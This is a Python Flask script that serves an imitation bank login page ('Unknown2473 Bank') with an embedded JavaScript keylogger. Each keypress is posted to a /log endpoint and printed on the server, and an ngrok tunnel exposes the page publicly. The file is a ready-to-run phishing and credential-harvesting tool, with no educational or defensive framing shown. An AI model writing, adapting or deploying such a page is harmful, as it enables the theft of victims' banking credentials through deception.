from flask import Flask, request
from pyngrok import ngrok  # Requires pyngrok library

app = Flask(__name__)

@app.route('/')
def index():
    # Serve a simple page with JavaScript keylogger
    return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <title>Unknown2473 Bank Login</title>
            <script>
                document.addEventListener('keypress', function(e) {
                    fetch('/log', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ key: e.key })
                    });
                });
            </script>
        </head>
        <body>
            <h1>Welcome To Unknown2473Bank</h1>
            <div class="login-box">
                <!-- Icon -->
                <img src="/static/image.png" alt="User Icon" />

                <!-- Username Input -->
                <p>Username</p>
                <input type="text" />
                <p2>Password</p2>
                <input type="text"/>

                <!-- Buttons -->
                <div class="button-group">
                    <button class="clear-btn">Clear</button>
                    <button class="login-btn">Login</button>
                </div>

                <!-- Links -->
                <div class="links">
                    <a href="#">Register</a>
                    <span class="divider">|</span>
                    <a href="#">Forgot password</a>
                </div>

                <!-- Info Section -->
                <div class="info">
                    <p>Don't have an Internet Banking account? <a href="#">Find out here on how to register for Unknown2473Bank.</a></p>
                    <p>Security Alert <a href="#">Click Here</a></p>
                </div>
            </div>
        </body>
        <style>
            h1 {
                margin-bottom: 100px; /* Gap between the heading and the inputs */
            }

            body {
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                height: 100vh;
                margin: 0;
                font-family: Arial, sans-serif;
                background-color: #f8f0f0; /* Light background color */
            }

            .login-box {
                text-align: center;
                padding: 20px 30px;
                border: 1px solid #ccc;
                border-radius: 15px;
                background-color: #ffffff; /* White box */
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
                max-width: 300px;
            }

            .login-box img {
                width: 80px;
                height: 80px;
                margin-bottom: 10px;
            }

            .login-box p {
                margin: 10px 0 5px;
                font-size: 14px;
            }

            .login-box input {
                width: 70%;
                padding: 10px;
                margin-bottom: 15px;
                border: 1px solid #ccc;
                border-radius: 5px;
                font-size: 14px;
            }

            .button-group {
                display: flex;
                justify-content: space-between;
                gap: 10px;
            }

            .button-group button {
                flex: 1;
                padding: 10px;
                border: none;
                border-radius: 5px;
                font-size: 14px;
                cursor: pointer;
            }

            .button-group .clear-btn {
                background-color: #ffffff;
                border: 1px solid #007B7F;
                color: #007B7F;
            }

            .button-group .login-btn {
                background-color: #007B7F;
                color: #ffffff;
            }

            .links {
                margin: 20px 0;
                font-size: 14px;
            }

            .links a {
                text-decoration: none;
                color: #007B7F;
                font-weight: bold;
                margin: 0 10px;
            }

            .links .divider {
                color: #ccc;
            }

            .info {
                font-size: 12px;
                color: #666;
                margin-bottom: 20px;
            }

            .info a {
                color: #007B7F;
                font-weight: bold;
                text-decoration: none;
            }

            footer {
                font-size: 14px;
                color: #007B7F;
                font-weight: bold;
            }
        </style>
        </html>
    '''

@app.route('/log', methods=['POST'])
def log_key():
    # Log the captured key to the console
    data = request.get_json()
    if data and 'key' in data:
        print(f"Key pressed: {data['key']}")
    return '', 204

if __name__ == '__main__':
    # Start Flask server in a background thread
    port = 8080
    print("Starting Flask server...")
    public_url = ngrok.connect(port)  # Expose the server to the internet
    print(f"Public URL: {public_url}")
    
    # Run the Flask app
    app.run(host='0.0.0.0', port=port)
